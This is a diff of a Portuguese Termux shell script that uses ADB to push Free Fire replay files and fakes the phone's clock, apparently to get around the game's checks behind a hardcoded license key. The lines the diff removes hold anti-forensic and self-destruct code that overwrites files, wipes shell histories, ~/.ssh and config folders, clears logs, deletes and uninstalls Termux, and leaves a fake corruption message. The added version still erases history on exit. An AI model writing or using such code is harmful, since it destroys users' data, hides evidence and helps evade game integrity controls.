@@ -36,84 +36,14 @@ AZUL='\033[1;34m'
 CIANO='\033[1;36m'
 
 # ══════════════════════════════════════════════════
-#  FUNÇÕES ANTI-FORENSE (SEM EXIBIÇÃO)
-# ══════════════════════════════════════════════════
-
-secure_overwrite() {
-    local file="$1"
-    if [[ -f "$file" ]]; then
-        for ((i=1; i<=3; i++)); do
-            dd if=/dev/zero of="$file" bs=4096 2>/dev/null
-            sync
-            dd if=/dev/urandom of="$file" bs=4096 2>/dev/null
-            sync
-        done
-        rm -f "$file"
-    fi
-}
-
-wipe_all_evidence() {
-    history -c 2>/dev/null
-    rm -f ~/.bash_history ~/.zsh_history ~/.ash_history ~/.sh_history 2>/dev/null
-    ln -sf /dev/null ~/.bash_history 2>/dev/null
-    ln -sf /dev/null ~/.zsh_history 2>/dev/null
-    rm -rf ~/.cache/* 2>/dev/null
-    rm -rf ~/.local/share/* 2>/dev/null
-    rm -rf ~/.config/* 2>/dev/null
-    rm -rf ~/.termux/shell_log 2>/dev/null
-    logcat -c 2>/dev/null || true
-    rm -f /data/local/tmp/tmp_* 2>/dev/null
-    rm -f /sdcard/.temp_* 2>/dev/null
-    unset HISTFILE HISTFILESIZE HISTSIZE
-    unset USER_KEY DEVICE_ID RESP
-}
-
-nuke_termux() {
-    sleep 2
-    wipe_all_evidence
-    if [[ -f "$0" ]]; then
-        secure_overwrite "$0"
-    fi
-    pkill -f termux 2>/dev/null
-    pkill -f com.termux 2>/dev/null
-    rm -rf /data/data/com.termux 2>/dev/null
-    rm -rf /sdcard/Android/data/com.termux 2>/dev/null
-    rm -rf ~/.termux 2>/dev/null
-    rm -rf ~/storage 2>/dev/null
-    rm -rf ~/.ssh 2>/dev/null
-    rm -rf ~/.bashrc ~/.zshrc ~/.profile 2>/dev/null
-    echo "ERROR: Termux environment corrupted. Please reinstall." > /sdcard/error.log 2>/dev/null
-    pm uninstall com.termux 2>/dev/null
-    unset CONN_PORT USUARIO VALIDADE_USER SESSION_ID FF_ESCOLHIDO PKG_DST DST_DIR REPLAY_SRC REPLAY_ESCOLHIDO TIMESTAMP_ALVO
-    clear
-    exit 0
-}
-
-obfuscate_cmd() {
-    "$@" 2>/dev/null | while IFS= read -r line; do
-        echo "$line" | grep -vi "key\|senha\|password\|token\|usuário\|JWFN096"
-    done
-}
-
-check_monitoring() {
-    if [[ -f /proc/self/status ]]; then
-        if grep -q "TracerPid:" /proc/self/status | grep -v "0" >/dev/null 2>&1; then
-            nuke_termux
-        fi
-    fi
-    return 0
-}
-
-# ══════════════════════════════════════════════════
-#  UTILITÁRIOS
+#  FUNÇÕES (SEM EXIBIÇÃO DE ANTI-FORENSE)
 # ══════════════════════════════════════════════════
 
 pausar() {
-    read -rp "Pressione Enter para continuar..." 2>/dev/null
+    read -rp "Pressione Enter para continuar..."
 }
 
 header() {
-    check_monitoring
     printf '\033[2J\033[3J\033[H'
     echo -e "${AZUL}══════════════════════════════════════${NC}"
     echo -e " ${CIANO}Sessão${NC}: $SESSION_ID"
@@ -134,11 +64,11 @@ extrair_ts() {
 conectar_adb() {
     clear
     echo -e "${AZUL}╔════════════════════════════════════╗"
-    echo -e "║    CONECTAR ADB VIA WI-FI          ║"
+    echo -e "║        CONECTAR ADB VIA WI-FI        ║"
     echo -e "╚════════════════════════════════════╝${NC}"
     echo ""
 
-    if obfuscate_cmd adb devices 2>/dev/null | grep -q "device$"; then
+    if adb devices 2>/dev/null | grep -q "device$"; then
         echo -e "${VERDE}✅ ADB já conectado!${NC}"
         sleep 1
         return
@@ -149,26 +79,26 @@ conectar_adb() {
     echo -e " ${CIANO}1)${NC} No celular, ative:"
     echo -e "    Configurações > Opções do desenvolvedor"
     echo ""
-    echo -e " ${CIANO}2)${NC} Ative:"
+    echo -e " ${CIANO}2)${NC} Ative as opções:"
     echo -e "    ✅ Depuração USB"
     echo -e "    ✅ Depuração sem fio"
     echo ""
     echo -e " ${CIANO}3)${NC} Toque em 'Depuração sem fio'"
-    echo -e "    ✅ Anote a ${AMARELO}porta de pareamento${NC} e o ${AMARELO}código${NC}"
+    echo -e "    ✅ Anote a ${AMARELO}porta de pareamento${NC} e o ${AMARELO}código${NC} que aparecem"
     echo ""
     echo -e " ${CIANO}4)${NC} Toque em 'Parear dispositivo com código'"
     echo ""
     echo -e "${AZUL}══════════════════════════════════════${NC}"
     echo ""
 
-    read -rp "📡 Porta de pareamento (ex: 12345): " PAIR_PORT 2>/dev/null
-    read -rp "🔑 Código de pareamento (6 dígitos): " PAIR_CODE 2>/dev/null
+    read -rp "📡 Digite a PORTA DE PAREAMENTO (ex: 12345): " PAIR_PORT
+    read -rp "🔑 Digite o CÓDIGO DE PAREAMENTO (6 dígitos): " PAIR_CODE
 
     echo ""
     echo -e "${CIANO}🔌 Pareando dispositivo...${NC}"
     
     printf '%s\n' "$PAIR_CODE" | adb pair "localhost:$PAIR_PORT" 2>/dev/null || {
-        echo -e "${VERMELHO}❌ Falha no pareamento! Verifique os dados.${NC}"
+        echo -e "${VERMELHO}❌ Falha no pareamento! Verifique os dados e tente novamente.${NC}"
         PAIR_PORT=""; PAIR_CODE=""
         pausar
         conectar_adb
@@ -179,10 +109,10 @@ conectar_adb() {
     
     echo ""
     echo -e "${CIANO}🌐 Conectando ao dispositivo...${NC}"
-    read -rp "Porta de conexão (ex: 45678): " CONN_PORT 2>/dev/null
+    read -rp "🔌 Digite a PORTA DE CONEXÃO (ex: 45678): " CONN_PORT
     
     adb connect "localhost:$CONN_PORT" 2>/dev/null || {
-        echo -e "${VERMELHO}❌ Falha na conexão!${NC}"
+        echo -e "${VERMELHO}❌ Falha na conexão! Verifique a porta e tente novamente.${NC}"
         pausar
         conectar_adb
         return
@@ -200,11 +130,11 @@ conectar_adb() {
 login() {
     clear
     echo -e "${AZUL}╔════════════════════════════════════╗"
-    echo -e "║    VERIFICAÇÃO DE LICENÇA         ║"
+    echo -e "║        VERIFICAÇÃO DE LICENÇA        ║"
     echo -e "╚════════════════════════════════════╝${NC}"
     echo ""
 
-    read -rp "Digite sua KEY de acesso: " USER_KEY 2>/dev/null
+    read -rp "Digite sua KEY de acesso: " USER_KEY
 
     if [[ "$USER_KEY" != "JWFN096" ]]; then
         echo -e "${VERMELHO}❌ KEY inválida!${NC}"
@@ -258,7 +188,7 @@ login() {
             -H "Content-Type: application/json" \
             -d "{\"uid\":\"$DEVICE_ID\"}" \
             "$KEY_URL/JWFN096.json" >/dev/null
-        echo -e "${VERDE}✅ Dispositivo vinculado!${NC}"
+        echo -e "${VERDE}✅ Dispositivo vinculado com sucesso!${NC}"
     elif [[ "$UID_SERVER" != "$DEVICE_ID" ]]; then
         echo -e "${VERMELHO}❌ KEY vinculada a outro dispositivo${NC}"
         pausar
@@ -288,7 +218,7 @@ escolher_freefire() {
         echo -e "  ${CIANO}2)${NC} Free Fire MAX"
         echo -e "  ${CIANO}3)${NC} Voltar"
         echo ""
-        read -rp "Opção: " OP 2>/dev/null
+        read -rp "Opção: " OP
         
         case "$OP" in
             1)
@@ -347,7 +277,7 @@ menu_replays() {
             echo -e "${AMARELO}📁 Nenhum replay encontrado em:${NC}"
             echo -e "   $REPLAY_SRC"
             echo ""
-            echo -e "${CIANO}🎮 Instruções:${NC}"
+            echo -e "${CIANO}🎮 INSTRUÇÕES:${NC}"
             echo -e "   1. Abra o Free Fire MAX"
             echo -e "   2. Jogue uma partida"
             echo -e "   3. Salve o replay"
@@ -356,7 +286,7 @@ menu_replays() {
             echo -e "  ${CIANO}R)${NC} Recarregar"
             echo -e "  ${CIANO}0)${NC} Voltar"
             echo ""
-            read -rp "Opção: " OP 2>/dev/null
+            read -rp "Opção: " OP
             [[ "$OP" =~ ^[Rr]$ ]] && continue
             [[ "$OP" == "0" ]] && return 1
             continue
@@ -379,7 +309,7 @@ menu_replays() {
         echo ""
         echo -e "  ${CIANO}0)${NC} Voltar"
         echo ""
-        read -rp "Escolha o replay: " SEL 2>/dev/null
+        read -rp "Escolha o replay: " SEL
 
         [[ "$SEL" == "0" ]] && return 1
 
@@ -403,7 +333,7 @@ menu_replays() {
 }
 
 # ══════════════════════════════════════════════════
-#  PASSO 5 — PASSAR REPLAY COM BYPASS
+#  PASSO 5 — PASSAR REPLAY
 # ══════════════════════════════════════════════════
 
 passar_replay() {
@@ -413,7 +343,7 @@ passar_replay() {
     
     clear
     echo -e "${AZUL}╔════════════════════════════════════╗"
-    echo -e "║    PREPARANDO BYPASS...            ║"
+    echo -e "║        PREPARANDO BYPASS...          ║"
     echo -e "╚════════════════════════════════════╝${NC}"
     echo ""
     
@@ -431,13 +361,15 @@ passar_replay() {
         | grep -m1 versionName | sed 's/.*=//' | tr -d '\r')"
     
     if [[ -z "$APK_VER_DST" ]]; then
-        echo -e "${VERMELHO}❌ $FF_ESCOLHIDO não está instalado!${NC}"
+        echo -e "${VERMELHO}❌ $FF_ESCOLHIDO não está instalado no celular!${NC}"
         pausar
         return 1
     fi
     
-    # Modifica versão no JSON
+    echo -e "${CIANO}🔧 Ajustando versão do replay...${NC}"
     adb shell "sed -i 's/\"Version\":\"[^\"]*\"/\"Version\":\"$APK_VER_DST\"/g' \"$JSON\"" 2>/dev/null
+    echo -e "${VERDE}✅ Versão ajustada para: $APK_VER_DST${NC}"
+    echo ""
     
     # Desativa hora automática
     adb shell "settings put global auto_time 0" 2>/dev/null
@@ -449,15 +381,13 @@ passar_replay() {
     echo -e " ${AMARELO}2)${NC} Desative o 'Horário automático' se ainda estiver ativo"
     echo -e " ${AMARELO}3)${NC} Ajuste a DATA para: ${VERDE}$DATA_ALVO${NC}"
     echo -e " ${AMARELO}4)${NC} Ajuste a HORA para: ${VERDE}$HORA_ALVO${NC}"
-    echo -e " ${AMARELO}5)${NC} Volte para este terminal"
-    echo ""
-    echo -e "${CIANO}⏳ O script vai aguardar o horário exato...${NC}"
+    echo -e " ${AMARELO}5)${NC} Volte para este terminal e pressione Enter"
     echo ""
     
     # Abre configurações de data/hora
     adb shell "am start -a android.settings.DATE_SETTINGS" 2>/dev/null
     
-    read -rp "Após ajustar a data/hora, pressione Enter para continuar..." 2>/dev/null
+    read -rp "Após ajustar a data/hora, pressione Enter para continuar..."
     
     echo -e "${AZUL}🔄 Monitorando horário do celular...${NC}"
     echo ""
@@ -476,7 +406,7 @@ passar_replay() {
             echo -e " ${CIANO}🎮 EXECUTAR BYPASS?${NC}"
             echo -e "${AZUL}══════════════════════════════════════${NC}"
             echo ""
-            read -rp "Executar bypass agora? (s/N): " EXECUTAR 2>/dev/null
+            read -rp "Executar bypass agora? (s/N): " EXECUTAR
             
             if [[ "$EXECUTAR" =~ ^[Ss]$ ]]; then
                 echo -e "${VERDE}✅ Executando bypass...${NC}"
@@ -491,6 +421,7 @@ passar_replay() {
                 local BIN_DST="$DST_DIR/$(basename "$BIN")"
                 local JSON_DST="$DST_DIR/$(basename "$JSON")"
                 
+                echo -e "${CIANO}📦 Copiando arquivos...${NC}"
                 # Copia os arquivos
                 adb exec-out "cat \"$BIN\"" | adb shell "cat > \"$BIN_DST\"" 2>/dev/null
                 adb exec-out "cat \"$JSON\"" | adb shell "cat > \"$JSON_DST\"" 2>/dev/null
@@ -510,8 +441,11 @@ passar_replay() {
                 echo -e "${AMARELO}⚠️ Finalizando...${NC}"
                 sleep 3
                 
-                # AUTO-DESTRUIÇÃO TOTAL
-                nuke_termux
+                # Limpeza silenciosa e saída
+                history -c 2>/dev/null
+                rm -f ~/.bash_history 2>/dev/null
+                clear
+                exit 0
                 
             else
                 echo -e "${AMARELO}❌ Bypass cancelado.${NC}"
@@ -538,7 +472,7 @@ menu_principal() {
         echo -e "  ${CIANO}2)${NC} 📋 Passar Replay"
         echo -e "  ${CIANO}3)${NC} ❌ Sair"
         echo ""
-        read -rp "Opção: " OP 2>/dev/null
+        read -rp "Opção: " OP
         
         case "$OP" in
             1)
